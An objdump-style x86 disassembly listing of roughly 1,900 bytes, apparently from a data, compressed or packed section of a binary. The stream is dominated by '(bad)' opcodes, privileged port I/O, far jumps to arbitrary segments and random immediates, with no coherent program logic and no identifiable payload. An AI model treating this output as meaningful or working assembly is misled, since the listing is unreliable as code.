  41d15a:	out    dx,eax
  41d15b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d15c:	lock and al,0x9f
  41d15f:	rcl    DWORD PTR [ecx-0x18],cl
  41d162:	ret    
  41d163:	or     eax,esp
  41d165:	xchg   edx,eax
  41d166:	sti    
  41d167:	imul   esp,DWORD PTR [ebp-0x4fe8b0ea],0xffffffc6
  41d16e:	jo     0x41d1dd
  41d170:	sbb    eax,esi
  41d172:	inc    esp
  41d173:	cmp    al,0x88
  41d175:	push   ds
  41d176:	in     al,dx
  41d177:	dec    ecx
  41d178:	push   0xffffffa5
  41d17a:	aam    0x6f
  41d17c:	sub    al,0x26
  41d17e:	test   BYTE PTR [ebx],bl
  41d180:	in     al,dx
  41d181:	test   DWORD PTR [esi+0x6e864eac],esi
  41d187:	in     eax,dx
  41d188:	cmp    DWORD PTR [eax+0x7],esi
  41d18b:	or     al,BYTE PTR [esi+edi*2]
  41d18e:	jns    0x41d110
  41d190:	stos   BYTE PTR es:[edi],al
  41d191:	mov    gs,WORD PTR [esi+0x4]
  41d194:	xchg   edx,eax
  41d195:	xor    ah,bl
  41d197:	mov    ah,BYTE PTR [ecx]
  41d199:	dec    ecx
  41d19a:	jmp    0xfe5:0xa07c9fd
  41d1a1:	shl    edi,cl
  41d1a3:	lahf   
  41d1a4:	outs   dx,BYTE PTR ds:[esi]
  41d1a5:	stos   BYTE PTR es:[edi],al
  41d1a6:	rcl    BYTE PTR fs:[eax],cl
  41d1a9:	inc    eax
  41d1aa:	inc    ecx
  41d1ab:	les    edi,FWORD PTR [edi+0x28a43c24]
  41d1b1:	stos   BYTE PTR es:[edi],al
  41d1b2:	jcxz   0x41d14d
  41d1b5:	fwait
  41d1b6:	fs cmp al,0x13
  41d1b9:	cmp    edx,DWORD PTR [ecx]
  41d1bb:	mov    DWORD PTR [edi],0x1a5bf3ab
  41d1c1:	sbb    esp,ecx
  41d1c3:	fisub  WORD PTR [eax-0x41]
  41d1c6:	pop    ebx
  41d1c7:	sbb    eax,DWORD PTR [eax-0x6326ba07]
  41d1cd:	das    
  41d1ce:	std    
  41d1cf:	xor    DWORD PTR [ebx+0x8f8b5f3],esp
  41d1d5:	ja     0x41d228
  41d1d7:	dec    ebp
  41d1d8:	jne    0x41d226
  41d1da:	or     eax,0x37d2432c
  41d1df:	dec    edx
  41d1e0:	adc    DWORD PTR [edx],eax
  41d1e2:	adc    BYTE PTR [ebp+0x24],ah
  41d1e5:	into   
  41d1e6:	std    
  41d1e7:	daa    
  41d1e8:	push   eax
  41d1e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1ea:	inc    edx
  41d1eb:	aad    0x4
  41d1ed:	inc    esp
  41d1ee:	xchg   esp,eax
  41d1ef:	inc    esp
  41d1f0:	adc    DWORD PTR [eax],ecx
  41d1f2:	mov    cl,0x2
  41d1f4:	mov    ecx,0x28151841
  41d1f9:	mov    ah,BYTE PTR [ecx+ebp*1-0xb]
  41d1fd:	outs   dx,DWORD PTR ds:[esi]
  41d1fe:	jmp    0xc174:0x5489b457
  41d205:	mov    cl,0xad
  41d207:	ds scas eax,DWORD PTR es:[edi]
  41d209:	fldcw  WORD PTR [edi-0x21]
  41d20c:	fisubr DWORD PTR [ebx]
  41d20e:	pop    esp
  41d20f:	ja     0x41d20e
  41d211:	jns    0x41d222
  41d213:	xlat   BYTE PTR ds:[ebx]
  41d214:	inc    ebx
  41d215:	xor    bl,BYTE PTR [ebx]
  41d217:	mov    ds:0x4f01e821,eax
  41d21c:	ins    DWORD PTR es:[edi],dx
  41d21d:	pxor   mm6,QWORD PTR [esp+eax*2+0x7]
  41d222:	push   edi
  41d223:	mov    ds:0xbab023e3,al
  41d228:	mov    al,0x1d
  41d22a:	sbb    DWORD PTR [eax+0x2c],0x71
  41d22e:	inc    edi
  41d22f:	xchg   ebx,eax
  41d230:	adc    al,0x43
  41d232:	and    eax,0xa2511a43
  41d237:	dec    esp
  41d238:	rcr    BYTE PTR ds:0x76e26607,1
  41d23e:	or     ebp,DWORD PTR [ebx+0x353baff3]
  41d244:	mov    ds,eax
  41d246:	xor    ah,ah
  41d248:	and    ah,ah
  41d24a:	pop    esi
  41d24b:	and    dh,BYTE PTR [edi]
  41d24d:	adc    BYTE PTR [edi+0x59],0x9f
  41d251:	retf   0xd58f
  41d254:	dec    esi
  41d255:	outs   dx,DWORD PTR ds:[esi]
  41d256:	gs jbe 0x41d241
  41d259:	push   es
  41d25a:	mov    ebx,0xde3408b1
  41d25f:	repz popa 
  41d261:	and    DWORD PTR [eax+0x73],esi
  41d264:	test   DWORD PTR [edi+0x3a7c4a83],ecx
  41d26a:	lods   eax,DWORD PTR ds:[esi]
  41d26b:	inc    esp
  41d26c:	mov    WORD PTR [eax-0x5d25f8b8],?
  41d272:	sub    eax,0xae78e386
  41d277:	data16 sub BYTE PTR [ecx],dh
  41d27a:	out    0x6a,al
  41d27c:	cwde   
  41d27d:	pop    es
  41d27e:	jo     0x41d26d
  41d280:	(bad)  
  41d281:	dec    ecx
  41d282:	mov    ebp,esp
  41d284:	sub    BYTE PTR [ebx-0x53b6ffae],ch
  41d28a:	aam    0x8d
  41d28c:	shr    DWORD PTR [edx-0x51f78bf],0xd7
  41d293:	and    BYTE PTR [si-0x4941],ah
  41d298:	add    cl,BYTE PTR [eax-0x39]
  41d29b:	sti    
  41d29c:	stos   BYTE PTR es:[edi],al
  41d29d:	ficomp DWORD PTR [ebp+0x56]
  41d2a0:	inc    ebx
  41d2a1:	jnp    0x41d2e7
  41d2a3:	dec    ebp
  41d2a4:	popf   
  41d2a5:	pop    eax
  41d2a6:	xchg   ebx,eax
  41d2a7:	stos   DWORD PTR es:[edi],eax
  41d2a8:	clc    
  41d2a9:	lock fnstcw WORD PTR [ebx-0x3ad6bb90]
  41d2b0:	fimul  WORD PTR [edi]
  41d2b2:	inc    ecx
  41d2b3:	adc    al,0x4e
  41d2b5:	mov    eax,ds:0x3682a0b
  41d2ba:	imul   esp,ebx,0xffffffd6
  41d2bd:	enter  0xf940,0xf
  41d2c1:	je     0x41d2be
  41d2c3:	dec    edi
  41d2c4:	push   ebp
  41d2c5:	and    BYTE PTR [ebx+0x3],dl
  41d2c8:	aam    0x52
  41d2ca:	jmp    0x5f9783dc
  41d2cf:	je     0x41d27a
  41d2d1:	rcl    DWORD PTR [ecx+0x7f822adb],0x84
  41d2d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2d9:	jle    0x41d282
  41d2db:	je     0x41d2b2
  41d2dd:	dec    esi
  41d2de:	jmp    0xd7e:0xeca993e3
  41d2e5:	rol    DWORD PTR [eax+0x17],cl
  41d2e8:	lea    ecx,[ebx+0x2a92e201]
  41d2ee:	loopne 0x41d314
  41d2f0:	in     eax,dx
  41d2f1:	mov    bl,0x41
  41d2f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2f4:	xor    DWORD PTR [eax],edi
  41d2f6:	ins    DWORD PTR es:[edi],dx
  41d2f7:	push   cs
  41d2f8:	les    esp,FWORD PTR [edx]
  41d2fa:	(bad)  
  41d2fc:	imul   ebp,DWORD PTR [ebx+edi*8+0x4b],0xe9ce529
  41d304:	popf   
  41d305:	fs dec esp
  41d307:	xlat   BYTE PTR ds:[ebx]
  41d308:	inc    esi
  41d309:	es push ss
  41d30b:	fwait
  41d30c:	cmp    DWORD PTR [ebp+0x73],0xee879b3b
  41d313:	mov    ch,0xb0
  41d315:	icebp  
  41d316:	ret    
  41d317:	adc    al,0x34
  41d319:	shl    DWORD PTR [eax],0x6d
  41d31c:	cwde   
  41d31d:	push   es
  41d31e:	push   ds
  41d31f:	xchg   edx,eax
  41d320:	cmp    al,0xee
  41d322:	xor    DWORD PTR [ebx],0x2160e513
  41d328:	mov    cs,WORD PTR [edx+0x3]
  41d32b:	sbb    ch,BYTE PTR [esp+ebp*1+0x36c7835d]
  41d332:	push   0x4dedab13
  41d337:	jno    0x41d2dc
  41d339:	push   0xffffffd7
  41d33b:	pop    eax
  41d33c:	mov    DWORD PTR [ebx],edx
  41d33e:	mov    dl,BYTE PTR [ebp-0x22]
  41d341:	mov    edx,0x34284910
  41d346:	test   edi,eax
  41d348:	repnz lock sbb esp,edi
  41d34c:	cli    
  41d34d:	lods   al,BYTE PTR ds:[esi]
  41d34e:	add    dl,BYTE PTR [edx]
  41d350:	stos   BYTE PTR es:[edi],al
  41d351:	mov    ch,0x88
  41d353:	ffree  st(3)
  41d355:	dec    edi
  41d356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d357:	pop    ecx
  41d358:	dec    ebp
  41d359:	sar    BYTE PTR [ecx-0xea40389],0x81
  41d360:	out    0x2e,eax
  41d362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d363:	mov    ebp,0x1378029f
  41d368:	dec    ebx
  41d369:	inc    ebx
  41d36a:	push   ebp
  41d36b:	xchg   DWORD PTR [ebx+0x30f2f106],ebp
  41d371:	and    al,0x57
  41d373:	imul   ecx,esi,0x556bd89d
  41d379:	jg     0x41d34b
  41d37b:	fidiv  DWORD PTR [ebp+0x5593a678]
  41d381:	jmp    0x8e604f4c
  41d386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d387:	mov    esp,DWORD PTR [esi]
  41d389:	or     bl,BYTE PTR [edi]
  41d38b:	xor    al,0xad
  41d38d:	adc    eax,0x2b6d6b89
  41d392:	imul   ecx,DWORD PTR [esi-0x7ad517e1],0x7ed6add6
  41d39c:	clc    
  41d39d:	inc    esp
  41d39e:	xchg   ebp,eax
  41d39f:	push   eax
  41d3a0:	shl    BYTE PTR [eax+0xc09363a],cl
  41d3a6:	or     DWORD PTR [ecx-0x6f],edx
  41d3a9:	pusha  
  41d3aa:	addr16 push ebx
  41d3ac:	imul   eax,DWORD PTR [esi+eiz*8+0x2e],0xe5b79f7e
  41d3b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3b5:	inc    edi
  41d3b6:	in     eax,0xf7
  41d3b8:	dec    ebp
  41d3b9:	(bad)  
  41d3ba:	mov    edi,0x4f438be8
  41d3bf:	(bad)  
  41d3c0:	bound  eax,QWORD PTR [ebx+edx*4-0x6d8294e8]
  41d3c7:	call   0xb9bee388
  41d3cc:	das    
  41d3cd:	sbb    eax,0x8954b0b0
  41d3d2:	dec    esi
  41d3d3:	mov    bl,0xaa
  41d3d5:	rol    DWORD PTR [ebp-0x5a],cl
  41d3d8:	cs pop ebx
  41d3da:	std    
  41d3db:	test   al,0xb3
  41d3dd:	inc    BYTE PTR [ebp-0xf]
  41d3e0:	rol    DWORD PTR [ebx-0x10],cl
  41d3e3:	mov    es,edx
  41d3e5:	jne    0x41d3da
  41d3e7:	test   al,0x3c
  41d3e9:	pusha  
  41d3ea:	leave  
  41d3eb:	sbb    eax,0xf1995ee0
  41d3f0:	xchg   ecx,eax
  41d3f1:	pushf  
  41d3f2:	gs out dx,eax
  41d3f4:	mov    ecx,0x313febfb
  41d3f9:	jmp    0x41d380
  41d3fb:	pop    edx
  41d3fc:	pop    ebx
  41d3fd:	sbb    al,0xa7
  41d3ff:	mov    bh,0x39
  41d401:	std    
  41d402:	sbb    BYTE PTR [edx-0x8c669df],al
  41d408:	pop    es
  41d409:	inc    edx
  41d40a:	and    ch,BYTE PTR [esi]
  41d40c:	or     edx,ecx
  41d40e:	mov    dl,BYTE PTR [ecx]
  41d410:	xor    ebp,ebx
  41d412:	fldcw  WORD PTR [edi-0x1]
  41d415:	dec    ebx
  41d416:	sub    dl,BYTE PTR ds:0x20de701e
  41d41c:	adc    al,0xbe
  41d41e:	out    0x22,al
  41d420:	pop    esi
  41d421:	adc    bh,bl
  41d423:	lods   al,BYTE PTR ds:[esi]
  41d424:	jecxz  0x41d3cc
  41d426:	mov    gs:0x4148b31c,al
  41d42c:	loop   0x41d497
  41d42e:	loope  0x41d42c
  41d430:	pop    ebp
  41d431:	push   ds
  41d432:	and    BYTE PTR [eax+0xd57a5ba],bl
  41d438:	scas   eax,DWORD PTR es:[edi]
  41d439:	cli    
  41d43a:	out    0xba,al
  41d43c:	or     edx,edx
  41d43e:	jge    0x41d419
  41d440:	nop
  41d441:	sub    DWORD PTR [esi+0x46a9f7b7],ecx
  41d447:	push   0xb
  41d449:	stc    
  41d44a:	test   al,0xa5
  41d44c:	stos   DWORD PTR es:[edi],eax
  41d44d:	dec    ecx
  41d44e:	xchg   ebx,eax
  41d44f:	push   edi
  41d450:	jg     0x41d492
  41d452:	add    al,0x64
  41d454:	mov    ch,0x68
  41d456:	sti    
  41d457:	xor    ecx,DWORD PTR [ebx-0x65]
  41d45a:	jp     0x41d451
  41d45c:	jno    0x41d47d
  41d45e:	je     0x41d3e1
  41d460:	(bad)  
  41d462:	dec    eax
  41d463:	ins    BYTE PTR es:[edi],dx
  41d464:	arpl   dx,sp
  41d466:	xchg   ebp,eax
  41d467:	pusha  
  41d468:	dec    edx
  41d469:	or     eax,0xbfaa82e4
  41d46e:	enter  0xf1f2,0x53
  41d472:	sbb    al,BYTE PTR [ebx+0x23]
  41d475:	push   edi
  41d476:	shl    ch,0x31
  41d479:	aaa    
  41d47a:	outs   dx,BYTE PTR ds:[esi]
  41d47b:	je     0x41d4f3
  41d47d:	inc    edx
  41d47e:	pop    ss
  41d47f:	in     eax,0x60
  41d481:	pop    ds
  41d482:	jnp    0x41d47e
  41d484:	stos   BYTE PTR es:[edi],al
  41d485:	sbb    DWORD PTR [bp+si],esp
  41d488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d489:	jae    0x2a8565f1
  41d48f:	repnz cmp bl,BYTE PTR [esi-0x39]
  41d493:	mov    ebp,0x9ab1f4
	...
  41d514:	daa    
  41d515:	and    eax,0xbb873b85
  41d51a:	mov    edi,0xe22d13d
  41d51f:	pusha  
  41d520:	dec    edx
  41d521:	cmc    
  41d522:	pop    ebp
  41d523:	and    esi,DWORD PTR ds:0x6b000171
  41d529:	pop    es
  41d52a:	add    BYTE PTR [eax],al
  41d52c:	pushf  
  41d52d:	xchg   ebx,eax
  41d52e:	add    eax,0xfe0cae33
  41d533:	lods   al,BYTE PTR ds:[esi]
  41d534:	jge    0x41d51c
  41d536:	in     eax,0x2d
  41d538:	jae    0x41d526
  41d53a:	lods   al,BYTE PTR ds:[esi]
  41d53b:	pop    edx
  41d53c:	les    eax,FWORD PTR [ebp+0x69dc37d7]
  41d542:	xchg   edx,eax
  41d543:	xchg   ecx,eax
  41d544:	sbb    al,0x46
  41d546:	mov    al,ds:0x757f80a3
  41d54b:	sub    eax,0x2a7dee48
  41d550:	pop    edi
  41d551:	push   0x56483fe5
  41d556:	std    
  41d557:	adc    DWORD PTR [esi+ebp*4-0x29580fc3],edi
  41d55e:	xor    dh,BYTE PTR [edx+edi*2]
  41d561:	stc    
  41d562:	jmp    0x1729:0x30c864b2
  41d569:	mov    ch,0xbf
  41d56b:	mov    esi,0xd98a051b
  41d570:	jg     0x41d536
  41d572:	or     eax,0x5f27210a
  41d578:	push   edi
  41d579:	jp     0x41d507
  41d57b:	jp     0x41d502
  41d57d:	or     bl,BYTE PTR ds:0x2aba51fe
  41d583:	push   cs
  41d584:	mov    dh,BYTE PTR [edi+0x727ff41d]
  41d58a:	mov    edi,0x11fd5a3d
  41d58f:	cmp    al,0xd7
  41d591:	jb     0x41d55e
  41d593:	fsubr  DWORD PTR [ecx-0x55]
  41d596:	ja     0xa7c5db94
  41d59c:	dec    edi
  41d59d:	and    al,0xe0
  41d59f:	and    dl,dh
  41d5a1:	pop    ebp
  41d5a2:	push   ebx
  41d5a3:	mov    dl,0xf
  41d5a5:	lahf   
  41d5a6:	(bad)  
  41d5a7:	sbb    al,0x25
  41d5a9:	stos   DWORD PTR es:[edi],eax
  41d5aa:	inc    eax
  41d5ab:	cmp    cl,0x29
  41d5ae:	sub    BYTE PTR [esi],dh
  41d5b0:	jmp    0x8202c878
  41d5b5:	jbe    0x41d610
  41d5b7:	(bad)  
  41d5b8:	mov    bl,0xb5
  41d5ba:	or     ecx,edx
  41d5bc:	sub    al,0xc1
  41d5be:	es pop ds
  41d5c0:	or     BYTE PTR [edx-0x3ef75e5],bh
  41d5c6:	imul   edi,edx,0x5d
  41d5c9:	pop    edi
  41d5ca:	mov    ebx,0x41573d8a
  41d5cf:	mov    ah,BYTE PTR [edi+0x37af1997]
  41d5d5:	push   edx
  41d5d6:	in     eax,0xab
  41d5d8:	add    dl,bh
  41d5da:	mov    cl,0x28
  41d5dc:	xlat   BYTE PTR ds:[ebx]
  41d5dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5de:	mov    al,ch
  41d5e0:	sbb    ebx,ecx
  41d5e2:	in     eax,dx
  41d5e3:	(bad)  
  41d5e4:	int    0x95
  41d5e6:	and    bh,BYTE PTR [ecx-0x3]
  41d5e9:	and    al,0xa0
  41d5eb:	dec    ebx
  41d5ec:	mov    edi,DWORD PTR [edi+0x5c793939]
  41d5f2:	cld    
  41d5f3:	cli    
  41d5f4:	sub    ecx,DWORD PTR ds:0x758bf214
  41d5fa:	push   0x1b8716f8
  41d5ff:	dec    ecx
  41d600:	mov    edi,0xc9cf3497
  41d605:	xchg   DWORD PTR [eax+0x35],ebx
  41d608:	sub    DWORD PTR ds:0x2d56dbff,esp
  41d60e:	bnd jl 0x41d5eb
  41d611:	retf   0xb356
  41d614:	pusha  
  41d615:	fild   QWORD PTR [eax-0x4d]
  41d618:	inc    ebp
  41d619:	ret    
  41d61a:	shr    DWORD PTR [edx-0x69],cl
  41d61d:	xor    esp,DWORD PTR [ebx+0x37ac2a79]
  41d623:	dec    edx
  41d624:	adc    ebp,DWORD PTR [esi-0x7f]
  41d627:	or     ebp,esi
  41d629:	sub    ch,dh
  41d62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d62c:	popa   
  41d62d:	cld    
  41d62e:	jp     0x41d647
  41d630:	push   edi
  41d631:	dec    edi
  41d632:	cwde   
  41d633:	cmp    eax,0xdf535458
  41d638:	ret    
  41d639:	enter  0x725c,0x15
  41d63d:	pop    es
  41d63e:	(bad)
  41d641:	fsub   DWORD PTR [ecx+0x44]
  41d644:	inc    bh
  41d646:	xor    edi,DWORD PTR [ebx-0x1d]
  41d649:	push   esi
  41d64a:	add    al,0xed
  41d64c:	pop    esi
  41d64d:	sti    
  41d64e:	cs pop esp
  41d650:	dec    ebp
  41d651:	mov    eax,ds:0x979e18a9
  41d656:	(bad)  
  41d657:	sub    ecx,edx
  41d659:	mov    dl,0xa8
  41d65b:	adc    eax,edi
  41d65d:	jmp    0xf8be0b6f
  41d662:	loopne 0x41d697
  41d664:	hlt    
  41d665:	scas   eax,DWORD PTR es:[edi]
  41d666:	pop    ecx
  41d667:	mov    ebx,0xe1896071
  41d66c:	fild   WORD PTR [eax]
  41d66e:	mov    ebp,0xd185d716
  41d673:	cld    
  41d674:	push   edi
  41d675:	(bad)  
  41d676:	shr    DWORD PTR [ebx-0x42],1
  41d679:	push   esp
  41d67a:	cdq    
  41d67b:	div    DWORD PTR [eax+0x2be230e]
  41d681:	inc    edi
  41d682:	in     al,0x9
  41d684:	jo     0x41d6c4
  41d686:	add    ecx,DWORD PTR [edi]
  41d688:	dec    edx
  41d689:	in     al,0xf5
  41d68b:	inc    ecx
  41d68c:	sub    DWORD PTR [eax-0x43a1d364],ebp
  41d692:	mov    BYTE PTR [edx-0x7e],dh
  41d695:	or     esp,DWORD PTR [ecx-0x34c7456d]
  41d69b:	xchg   ebp,eax
  41d69c:	dec    ecx
  41d69d:	inc    edx
  41d69e:	mov    bh,0x16
  41d6a0:	stos   DWORD PTR es:[edi],eax
  41d6a1:	push   edx
  41d6a2:	outs   dx,BYTE PTR ds:[esi]
  41d6a3:	inc    edx
  41d6a4:	daa    
  41d6a5:	pop    ebx
  41d6a6:	xchg   dh,al
  41d6a8:	lahf   
  41d6a9:	dec    DWORD PTR [ebp+0x93aa8aa]
  41d6af:	xor    DWORD PTR ds:0xd97bc24c,ebx
  41d6b5:	in     eax,dx
  41d6b6:	mov    cl,0x69
  41d6b8:	push   edi
  41d6b9:	and    esi,eax
  41d6bb:	dec    edi
  41d6bc:	sbb    ch,ch
  41d6be:	(bad)  
  41d6bf:	aas    
  41d6c0:	pop    ebx
  41d6c1:	out    0xf7,al
  41d6c3:	mov    WORD PTR [esi-0x4fbc81fd],ss
  41d6c9:	xchg   edx,eax
  41d6ca:	mov    al,ds:0x8fb70362
  41d6cf:	int3   
  41d6d0:	mov    WORD PTR ds:0xc60c98f6,?
  41d6d6:	pushf  
  41d6d7:	sbb    eax,0xcd04f08
  41d6dc:	jge    0x41d757
  41d6de:	inc    edi
  41d6df:	sub    BYTE PTR [edx+0x4d],ch
  41d6e2:	clc    
  41d6e3:	mov    edx,0xd0b91dce
  41d6e8:	pop    edx
  41d6e9:	inc    esp
  41d6ea:	fldcw  WORD PTR [ecx+0x24]
  41d6ed:	xchg   BYTE PTR [edx+0x77],cl
  41d6f0:	jp     0x41d75a
  41d6f2:	inc    esp
  41d6f3:	stos   DWORD PTR es:[edi],eax
  41d6f4:	sub    DWORD PTR ds:0x4afcb80b,esp
  41d6fa:	jno    0x41d70f
  41d6fc:	dec    esp
  41d6fd:	outs   dx,DWORD PTR ds:[esi]
  41d6fe:	ja     0x41d6ff
  41d700:	mov    al,0x39
  41d702:	cld    
  41d703:	fadd   QWORD PTR [edi]
  41d705:	ret    0x556e
  41d708:	leave  
  41d709:	add    DWORD PTR [eax],ebx
  41d70b:	cmp    eax,0x4ab58fd
  41d710:	push   ss
  41d711:	sbb    eax,0xfbecc966
  41d716:	xor    dl,dh
  41d718:	mov    ah,0xd1
  41d71a:	pop    ds
  41d71b:	mov    bh,0x76
  41d71d:	adc    edx,0xffffffdc
  41d720:	push   ss
  41d721:	cld    
  41d722:	pop    edi
  41d723:	xor    edi,0xffffff82
  41d726:	mov    esi,ebp
  41d728:	outs   dx,BYTE PTR ds:[esi]
  41d729:	stos   DWORD PTR es:[edi],eax
  41d72a:	mov    eax,ds:0x17d9235f
  41d72f:	jl     0x41d701
  41d731:	inc    ecx
  41d732:	cmp    al,0x24
  41d734:	fild   WORD PTR [eax-0x2c3034fc]
  41d73a:	jb     0x41d6dc
  41d73c:	xchg   esp,eax
  41d73d:	cdq    
  41d73e:	cmp    dh,ah
  41d740:	and    eax,0xdc51bfd6
  41d745:	fs stos DWORD PTR es:[edi],eax
  41d747:	or     BYTE PTR [edi-0x6d],dl
  41d74a:	ds mov fs,edi
  41d74d:	jo     0x41d7c8
  41d74f:	js     0x41d729
  41d751:	sub    BYTE PTR [ebx],dl
  41d753:	test   al,0x4e
  41d755:	pop    esi
  41d756:	adc    edx,DWORD PTR [eax-0x18]
  41d759:	push   ebx
  41d75a:	jbe    0x41d743
  41d75c:	int    0xe
  41d75e:	xchg   ecx,eax
  41d75f:	dec    ecx
  41d760:	(bad)  
  41d761:	ja     0x41d6ec
  41d763:	dec    ebp
  41d764:	mov    bh,0xe1
  41d766:	int3   
  41d767:	sbb    DWORD PTR [ebx+0x359da496],eax
  41d76d:	test   al,ch
  41d76f:	inc    edi
  41d770:	rcr    DWORD PTR [edx+edx*2+0x6cd1b908],cl
  41d777:	jne    0x41d737
  41d779:	aad    0x11
  41d77b:	push   ss
  41d77c:	xchg   ebp,eax
  41d77d:	or     al,0x4f
  41d77f:	lock sbb al,0xa8
  41d782:	rol    bh,0x54
  41d785:	dec    ebx
  41d786:	mov    edx,0x472313c5
  41d78b:	inc    esp
  41d78c:	es push ecx
  41d78e:	adc    BYTE PTR [ecx+edi*2+0x5c7d5d35],bl
  41d795:	push   0x98e17e5f
  41d79a:	mov    bl,0xef
  41d79c:	aaa    
  41d79d:	fidivr WORD PTR [eax-0x52b8cec0]
  41d7a3:	popf   
  41d7a4:	add    ebx,ebp
  41d7a6:	mov    cl,bh
  41d7a8:	cmp    bl,dl
  41d7aa:	stos   WORD PTR es:[edi],ax
  41d7ac:	xchg   bl,bh
  41d7ae:	sbb    edi,DWORD PTR [ecx+edx*1-0x5b]
  41d7b2:	xchg   ebx,eax
  41d7b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7b4:	scas   eax,DWORD PTR es:[edi]
  41d7b5:	mov    dl,0xdc
  41d7b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7b8:	inc    edx
  41d7b9:	rcl    ebx,1
  41d7bb:	and    al,0x1a
  41d7bd:	ins    BYTE PTR es:[edi],dx
  41d7be:	and    eax,0x42f52f5
  41d7c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7c4:	ret    0xdd2
  41d7c7:	loop   0x41d83f
  41d7c9:	jno    0x41d820
  41d7cb:	mov    ds:0x1abb130f,eax
  41d7d0:	imul   esp,DWORD PTR [edi-0x2],0xc5250fcd
  41d7d7:	jp     0x41d7ed
  41d7d9:	pmaxub mm7,mm0
  41d7dc:	dec    ecx
  41d7dd:	bound  esp,QWORD PTR [eax-0xe01fc0b]
  41d7e3:	jmp    0xc927fd93
  41d7e8:	nop
  41d7e9:	jmp    0x67e0:0xecc15226
  41d7f0:	push   eax
  41d7f1:	in     al,dx
  41d7f2:	pop    edi
  41d7f3:	test   dh,ch
  41d7f5:	ss pushf 
  41d7f7:	push   DWORD PTR [edx-0x5d]
  41d7fa:	arpl   WORD PTR [edi+0x52ef4803],di
  41d800:	js     0x41d859
  41d802:	lahf   
  41d803:	iret   
  41d804:	test   al,0x81
  41d806:	lods   al,BYTE PTR ds:[esi]
  41d807:	mov    ds:0x7a6a05be,eax
  41d80c:	int    0xa1
  41d80e:	test   bl,0x11
  41d811:	jno    0x41d80f
  41d813:	sbb    al,BYTE PTR [esi-0x628258b2]
  41d819:	test   BYTE PTR [ecx+0x1f8f3a09],ch
  41d81f:	lock mov esi,0x1370fd8d
  41d825:	std    
  41d826:	sbb    al,0x9a
  41d828:	test   eax,0x46aec618
  41d82d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d82e:	or     BYTE PTR [ebx+0x78],bh
  41d831:	scas   eax,DWORD PTR es:[edi]
  41d832:	jecxz  0x41d89f
  41d834:	dec    esp
  41d835:	jle    0x41d7c6
  41d837:	cld    
  41d838:	cmp    eax,0x2b85ee04
  41d83d:	dec    eax
  41d83e:	ds or  eax,esi
  41d841:	and    DWORD PTR [ebx+0x5c8ffd30],ebp
  41d847:	jae    0x41d810
  41d849:	or     al,0x8a
  41d84b:	mov    dh,0xc
  41d84d:	shl    BYTE PTR [edx+0x46],1
  41d850:	lods   eax,DWORD PTR ds:[esi]
  41d851:	lods   al,BYTE PTR ds:[esi]
  41d852:	gs addr16 fmulp st(7),st
  41d856:	or     al,0xc
  41d858:	xchg   ebp,eax
  41d859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d85a:	xchg   edx,eax
  41d85b:	mov    cl,BYTE PTR [esi-0x67aadb6d]
  41d861:	inc    ebp
  41d862:	sahf   
  41d863:	femms  
  41d865:	mov    ebp,0x58a213f
  41d86a:	rcr    eax,0x25
  41d86d:	sti    
  41d86e:	cwde   
  41d86f:	inc    ecx
  41d870:	inc    ebx
  41d871:	ds xor eax,0x4ff4a09
  41d877:	mov    dl,dl
  41d879:	jg     0x41d870
  41d87b:	dec    eax
  41d87c:	adc    ah,BYTE PTR [edi+0x22b67449]
  41d882:	js     0x41d823
  41d884:	cld    
  41d885:	and    eax,0x6a79ba36
  41d88a:	daa    
  41d88b:	sub    DWORD PTR [ebx+0x365f7f77],0xffffffff
  41d892:	and    DWORD PTR [eax-0x60],ebp
  41d895:	pop    ds
  41d896:	xor    dl,BYTE PTR [ebx+0x6ab64968]
  41d89c:	repnz inc eax
  41d89e:	fiadd  DWORD PTR [eax+0xd]
  41d8a1:	das    
  41d8a2:	xchg   BYTE PTR [eax],cl
  41d8a4:	mov    WORD PTR [ecx+0x489b5407],?
  41d8aa:	ins    DWORD PTR es:[edi],dx
  41d8ab:	fmul   QWORD PTR [esi-0x3f]
  41d8ae:	dec    edi
  41d8af:	xchg   edi,eax
  41d8b0:	jle    0x41d8ee
  41d8b2:	xor    dl,dl
  41d8b4:	iret   
  41d8b5:	jl     0x41d8ed
  41d8b7:	pop    edx
  41d8b8:	sbb    al,0x42
  41d8ba:	repz xor eax,0x7cad9b0f
  41d8c0:	(bad)  
  41d8c2:	dec    edx
  41d8c3:	and    dh,BYTE PTR [esi]
  41d8c5:	sti    
  41d8c6:	pop    edi
  41d8c7:	push   eax
  41d8c8:	imul   ebx,DWORD PTR [eax+0x402da9f6],0x4
  41d8cf:	mov    WORD PTR [edx-0x23bf9b1b],cs
  41d8d5:	inc    eax
  41d8d6:	scas   al,BYTE PTR es:[edi]
  41d8d7:	inc    edi
  41d8d8:	bound  ebp,QWORD PTR [esi+0x6f]
  41d8db:	data16 sbb al,0x4a
  41d8de:	popa   
  41d8df:	mov    edi,0xfc10178d
  41d8e4:	out    0x8d,al
  41d8e6:	fdiv   QWORD PTR [ebx+0x7b]
  41d8e9:	lock or BYTE PTR [ecx],al
  41d8ec:	inc    ecx
  41d8ed:	sub    BYTE PTR [ebp+0x7443ca3],al
  41d8f3:	fmul   st(5),st
  41d8f5:	lods   eax,DWORD PTR ds:[esi]
  41d8f6:	stc    
  41d8f7:	sub    DWORD PTR [esi-0x6b],ebp
  41d8fa:	add    al,0x65
  41d8fc:	fxch   st(4)
  41d8fe:	pop    edi
  41d8ff:	adc    edx,DWORD PTR [eax*2+0x2da44bcd]
  41d906:	mov    bh,0x52
  41d908:	dec    esp
  41d909:	jmp    0xbe78:0x9ac4060c
  41d910:	std    
